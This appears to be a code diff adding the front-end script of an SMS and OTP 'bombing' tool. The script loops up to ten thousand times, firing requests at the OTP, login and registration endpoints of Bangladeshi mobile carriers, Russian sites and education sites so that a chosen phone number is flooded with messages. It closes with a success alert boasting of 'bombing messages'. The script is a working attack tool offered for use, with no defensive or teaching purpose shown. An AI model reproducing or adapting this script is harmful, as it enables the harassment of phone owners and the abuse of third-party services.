@@ -1,0 +1,177 @@
+
+$(document).on('click', '#send', function() {
+    var amount = $("#amount").val();
+    var mobile = $("#mobile").val();
+    var option = $("#option").val();
+    var url = "https://myblapi.banglalink.net/api/v1/send-otp";
+    if (option != 'lol') {
+        if (option == "BANGLALINK-SERVER") {
+            url = "https://assetliteapi.banglalink.net/api/v1/user/otp-login/request";
+        } else if (option == "ROBI-SERVER-1") {
+            url = "https://smart1216.robi.com.bd/robisivr/login-process";
+        } else if (option == "AIRTEL-SERVER-1") {
+            url = "https://smart1216.robi.com.bd/sivr/login-process";
+        } else if (option == "ROBI-SERVER-2") {
+            url = "https://cloud4.preneurlab.com/robinewbot/user.php?cname=BotolBaba&cnumber=88" + mobile + "&resent";
+        } else if (option == "AIRTEL-SERVER-2") {
+            url = "https://airtelbot.forbangladesh.com/webbot-new/user.php?cname=BotolBaba&cnumber=88" + mobile + "&resent";
+        }
+    }
+    if (amount < 10001 && mobile.length == 11) {
+        $.ajax({
+            type: "GET",
+            url: '/vr.php',
+            success: res=>{
+                if (res == 'FUCK THE WORLD') {
+                    var c = 0;
+                    $.ajax({
+                        type: "POST",
+                        url: '/st.php',
+                        data: {
+                            mobile: mobile,
+                            amount: amount,
+                            from: option,
+                            smslog: 'true'
+                        },
+                        success: res=>{
+                            if (option == 'random') {
+                                while (c < amount) {
+                                    url = "https://www.bioscopelive.com/en/login/send-otp?phone=88" + mobile + "&operator=bd-otp";
+                                    $.ajax({
+                                        type: "POST",
+                                        url: url,
+                                    });
+                                    c += 1;
+                                    url = "https://findclone.ru/register?phone=+88" + mobile + "&resent";
+                                    $.ajax({
+                                        type: "POST",
+                                        url: url,
+                                    });
+                                    c += 1;
+                                    url = "https://youla.ru/web-api/auth/request_code";
+                                    $.ajax({
+                                    type: "POST",
+                                    url: url,
+                                    data: {
+                                    phone: "88" + mobile
+                                        },
+                                    });
+                                    c += 1;
+                                    url = "https://dev.10minuteschool.com/api/v4/auth/sendOtp";
+                                    $.ajax({
+                                    type: "POST",
+                                    url: url,
+                                    data: {
+                                    contact: "88" + mobile
+                                        },
+                                    });
+                                    c += 1;
+                                    url = "https://airtelbot.forbangladesh.com/webbot-new/user.php?cname=BotolBaba&cnumber=88" + mobile + "&resent";
+                                    $.ajax({
+                                        type: "GET",
+                                        url: url,
+                                    });
+                                    c += 1;
+                                    url = "https://cloud4.preneurlab.com/robinewbot/user.php?cname=BotolBaba&cnumber=88" + mobile + "&resent";
+                                    $.ajax({
+                                        type: "GET",
+                                        url: url,
+                                    });
+                                    c += 1;
+                                    var rand = Math.random();
+                                    url = "https://online.uttoron.academy/Registration?nickName=" + rand + "&mobileNumber=88" + mobile;
+                                    $.ajax({
+                                        type: "GET",
+                                        url: url,
+                                    });
+                                    c += 1;
+                                } 
+                                
+                } else if (option == 'ROBI-SERVER-1' || option == 'AIRTEL-SERVER-1') {
+                                while (c < amount) {
+                                    $.ajax({
+                                        type: "POST",
+                                        url: url,
+                                        data: {
+                                            cli: mobile,
+                                            language: "BN"
+                                        },
+                                    });
+                                    c += 1;
+                                }
+                            } else if (option == 'AIN') {
+                                while (c < amount) {
+                                	url: "https://dev.10minuteschool.com/api/v4/auth/sendOtp";
+                                    $.ajax({
+                                        type: "POST",
+                                        url: url,
+                                        data: {
+                                            contact: "88" + mobile
+                                        },
+                                    });
+                                    c += 1;
+                                    url: "https://youla.ru/web-api/auth/request_code";
+                                    $.ajax({
+                                    type: "POST",
+                                    url: url,
+                                    data: {
+                                    phone: "88" + mobile
+                                        },
+                                    });
+                                    c += 1;
+                                    url: "https://findclone.ru/register?phone=+88" + mobile + "&resent";
+                                    $.ajax({
+                                        type: "POST",
+                                        url: url,
+                                    });
+                                    c += 1;
+                                    var rand = Math.random();
+                                    url: "https://online.uttoron.academy/Registration?nickName=" + rand + "&mobileNumber=88" + mobile;
+                                    $.ajax({
+                                    type: "GET",
+                                    url: url,
+                                    });
+                                    c += 1;
+                                }
+                            } else if (option == 'BANGLALINK-SERVER') {
+                                while (c < amount) {
+                                    $.ajax({
+                                        type: "POST",
+                                        url: url,
+                                        data: {
+                                            mobile: mobile
+                                        },
+                                    });
+                                    c += 1;
+                                }
+                            } else {
+                                while (c < amount) {
+                                    $.ajax({
+                                        type: "GET",
+                                        url: url,
+                                    });
+                                    c += 1;
+                                }
+                            }
+                            alert(amount + " BOMBING MESSAGES HAS BEEN SEND SUCCESSFULLY");
+                        }
+                    });
+                } else {
+                    alert("IF YOU FACE ANY KIND OF ERROR CONTACT ME\n www.facebook.com/themehtan");
+                }
+            }
+        });
+    } else {
+        alert("INVALID MOBILE NUMBER or MAXIMUM LIMIT EXIST.");
+    }
+    
+    
+     //menu active
+    $(".nav-item a").on('click', function () {
+
+        $(".nav-item a").removeClass('active');
+        $(this).addClass('active');
+
+    });
+    
+});
